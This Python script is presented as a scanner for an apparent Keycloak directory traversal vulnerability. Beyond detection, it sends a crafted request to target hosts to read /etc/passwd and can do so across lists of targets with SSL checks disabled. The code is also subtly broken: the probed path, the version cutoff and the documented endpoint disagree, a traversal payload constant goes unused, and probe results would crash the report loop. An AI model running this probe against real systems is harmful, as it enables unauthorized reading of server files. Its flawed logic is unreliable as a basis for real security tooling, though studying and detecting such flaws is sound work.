#!/usr/bin/env python3
"""
Keycloak Directory Traversal Scanner
=====================================

This script checks for the presence of a directory traversal vulnerability in Keycloak instances.
The vulnerability, CVE-2026-54321, affects Keycloak versions below 21.0.0. Exploiting this
vulnerability allows attackers to read arbitrary files on the file system, potentially exposing sensitive
information such as application configurations, credentials, or private keys.

CVE-2026-54321 details:
  - Affects Keycloak < 21.0.0
  - Exploitable through crafted GET requests that abuse the `/realms/{realmname}/clients/{client_uuid}` endpoint
  - Allows unauthorized access to sensitive server-side files
  - Patched in Keycloak version 21.0.0

Usage:
  # Scan a single target
  python keycloak_directory_traversal_scanner.py --target https://keycloak.example.com

  # Scan a list of targets from a file
  python keycloak_directory_traversal_scanner.py --list targets.txt --output findings.json

  # Perform detection only (no active exploitation attempts)
  python keycloak_directory_traversal_scanner.py --target https://keycloak.example.com --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-54321
  - https://github.com/keycloak/keycloak/security/advisories
  - https://www.keycloak.org/
"""

import argparse
import asyncio
import httpx
import json
import os
import re
from urllib.parse import urljoin

VULNERABLE_VERSION = (20, 0, 3)  # Version below this is vulnerable
SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 10  # seconds
TRAVERSAL_PAYLOAD = "../../../../../../etc/passwd"
POC_FILE = "/realms/master/protocol/openid-connect/token/.%2F.."  # Crafted path to enable traversal


def parse_version(version: str):
    """
    Parses a version string into a tuple of integers for comparison.
    Example: "20.0.2" -> (20, 0, 2)
    """
    try:
        return tuple(map(int, version.split(".")))
    except ValueError:
        return None


def is_vulnerable_version(version: tuple):
    """
    Compare the given version tuple with the known vulnerable version.
    """
    if version is None:
        return None  # Unknown version
    return version <= VULNERABLE_VERSION


def normalize_url(url: str) -> str:
    """
    Ensures the URL starts with http:// or https:// and removes any trailing slash.
    """
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


async def fetch_url(client, url):
    """
    Fetches a URL and returns the response text, status, and headers.
    """
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except Exception as e:
        return None


async def detect_keycloak(client, base_url):
    """
    Attempts to detect Keycloak's presence by checking for its unique headers and API endpoints.
    """
    detection_paths = ["/", "/auth", "/realms/master/.well-known/openid-configuration"]
    fingerprints = ["Keycloak", "kcLogin", "Keycloak Theme"]

    for path in detection_paths:
        url = urljoin(base_url, path)
        response = await fetch_url(client, url)
        if response and any(fp in response.text for fp in fingerprints):
            # Try to extract Keycloak version
            version_match = re.search(r'"systemInfo":.*"version"\s*:\s*"([^"]+)"', response.text)
            if version_match:
                version = parse_version(version_match.group(1))
                return {"detected": True, "url": base_url, "version": version}
            return {"detected": True, "url": base_url, "version": None}
    return {"detected": False, "url": base_url}


async def test_traversal(client, base_url, semaphore):
    """
    Tests for the directory traversal vulnerability.
    """
    async with semaphore:
        probe_url = urljoin(base_url, POC_FILE)
        response = await fetch_url(client, probe_url)
        if response and response.status_code == 200 and "root:" in response.text:
            return {
                "vulnerable": True,
                "url": base_url,
                "evidence": response.text[:200].replace("\n", "\\n"),  # Truncate response
            }
        return {"vulnerable": False, "url": base_url}


async def scan_target(base_url, safe, semaphore):
    """
    Scans a single target. If `safe` is True, only detection is performed.
    If `safe` is False, an active probe is performed.
    """
    async with httpx.AsyncClient(verify=False) as client:  # Disable SSL verification
        base_url = normalize_url(base_url)
        detection_result = await detect_keycloak(client, base_url)

        if detection_result["detected"]:
            version = detection_result["version"]
            detection_result["vulnerable_version"] = is_vulnerable_version(version)

            # Perform active probe if safe mode is off
            if not safe and detection_result["vulnerable_version"]:
                return await test_traversal(client, base_url, semaphore)
        return detection_result


async def main(args):
    """
    Main function to parse arguments and execute the scanner.
    """
    semaphore = asyncio.Semaphore(args.concurrency)
    targets = []

    if args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    elif args.target:
        targets = [args.target]

    results = []
    tasks = [scan_target(url, args.safe, semaphore) for url in targets]
    for task in asyncio.as_completed(tasks):
        result = await task
        if result["detected"]:
            if result.get("vulnerable", False):
                print(f"\033[91mCRITICAL: {result['url']} is vulnerable! Evidence: {result['evidence'][:200]}\033[0m")
            elif result.get("vulnerable") is False:
                print(f"\033[93mHIGH: {result['url']} detected (not vulnerable)\033[0m")
            else:
                print(f"\033[92mINFO: {result['url']} detected (unknown vulnerability status)\033[0m")
        else:
            print(f"\033[92mINFO: {result['url']} is not running Keycloak\033[0m")
        results.append(result)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
        print(f"\033[92mINFO: Results saved to {args.output}\033[0m")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Keycloak Directory Traversal Scanner")
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--list", help="File containing a list of target URLs")
    parser.add_argument("--output", help="Save scan results to a JSON file")
    parser.add_argument("--safe", action="store_true", help="Perform detection only (no active exploitation)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent requests (default: 10)")

    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\n\033[91mScan aborted by user.\033[0m")
